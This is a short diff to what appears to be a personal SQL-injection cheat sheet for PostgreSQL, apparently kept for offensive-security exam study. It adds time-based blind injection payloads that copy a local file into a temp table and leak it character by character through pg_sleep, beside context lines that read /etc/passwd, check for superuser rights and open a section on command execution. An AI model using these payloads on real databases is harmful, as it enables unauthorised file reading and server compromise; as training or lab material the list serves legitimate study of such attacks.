@@ -262,6 +262,9 @@ select pg_read_file('/etc/passwd');
 -------------TIME BASED-------------
 # CHECK IF CURRENT USER IS SUPERUSER
 1;SELECT case when (SELECT current_setting($$is_superuser$$))=$$on$$ then pg_sleep(15) end;--
+# READ FILES
+1;create temp table awae (content text);copy awae from $$c:\awae.txt$$;select case when(ascii(substr((select content from awae),1,1))=104) then pg_sleep(10) end;-- 
+1;create temp table awae (content text);copy awae from $$c:\awae.txt$$;select case when(ascii(substr((select content from awae),2,1))=105) then pg_sleep(10) end;--
 
 -------------RCE
 postgres=# DROP TABLE IF EXISTS cmd_exec;
